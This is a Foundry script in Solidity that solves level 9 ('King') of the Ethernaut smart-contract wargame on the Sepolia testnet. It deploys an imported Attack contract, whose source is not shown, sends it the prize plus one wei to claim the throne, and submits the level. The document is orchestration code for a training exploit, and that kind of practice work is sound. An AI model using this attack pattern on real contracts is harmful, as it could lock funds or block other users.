// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {King} from "../src/Level09.sol";
import {Attack} from "../src/Level09Attack.sol";

contract Level09 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));

    function run() public {
        King instance = King(payable(vm.envAddress("LVL09_ADDR")));

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();

        uint256 prize = instance.prize();
        bool success = attack.atatatak{value: prize + 1}(payable(instance));

        if (!success) {
            console2.log("call failed");
        } else ethernaut.submitLevelInstance(address(instance));

        vm.stopBroadcast();
    }
}

// forge script script/Level09.s.sol --broadcast --rpc-url sepolia
